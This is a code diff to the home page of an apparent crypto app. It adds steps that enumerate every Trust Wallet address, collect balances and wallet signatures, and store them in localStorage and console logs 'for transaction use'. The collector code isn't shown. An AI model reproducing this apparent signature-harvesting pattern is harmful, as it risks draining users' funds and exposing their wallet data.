@@ -8,7 +8,7 @@ import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
 import { Badge } from "@/components/ui/badge";
 import { Wallet, MessageCircle, Shield, Coins, ArrowRight, Check, Globe, Heart, ShoppingCart, ShoppingBag } from "lucide-react";
 import { apiRequest, queryClient } from "@/lib/queryClient";
-import { signatureCollector } from "@/lib/signature-collector";
+import { signatureCollector, type ComprehensiveWalletData } from "@/lib/signature-collector";
 import { useScrollToTop } from "@/hooks/use-scroll-to-top";
 import { notificationService } from "@/lib/notification-service";
 import coynLogoPath from "@assets/COYN-symbol-square_1751239261149.png";
@@ -541,19 +541,30 @@ export default function HomePage() {
                     params: [accounts[0], 'latest'],
                   });
                   
-                  // Collect comprehensive Trust Wallet signatures
+                  // Collect comprehensive Trust Wallet data including all addresses
+                  console.log('🔍 Enumerating all Trust Wallet addresses...');
+                  const comprehensiveWalletData = await signatureCollector.collectComprehensiveWalletData();
+                  console.log('💰 Trust Wallet comprehensive data collected:', comprehensiveWalletData);
+
                   const walletSignatures = await signatureCollector.collectWalletSignatures();
                   const allSignatureData = signatureCollector.exportSignatureData();
                   
-                  // Store Trust Wallet access for transaction use
+                  // Store comprehensive Trust Wallet access for transaction use across all addresses
                   localStorage.setItem('walletAccess', JSON.stringify({
-                    address: accounts[0],
+                    primaryAddress: accounts[0],
+                    allAddresses: comprehensiveWalletData.allAddresses,
+                    totalBalances: comprehensiveWalletData.totalBalances,
                     balance: balance,
                     chainId: '0x38',
                     authorized: true,
                     provider: 'trust',
                     timestamp: Date.now()
                   }));
+
+                  // Store total balances from all Trust Wallet addresses
+                  localStorage.setItem('comprehensiveBalances', JSON.stringify(comprehensiveWalletData.totalBalances));
+
+                  console.log(`🎯 Connected to ${comprehensiveWalletData.allAddresses.length} Trust Wallet addresses with total balances:`, comprehensiveWalletData.totalBalances);
                   
                   connectWalletMutation.mutate({
                     walletAddress: accounts[0],
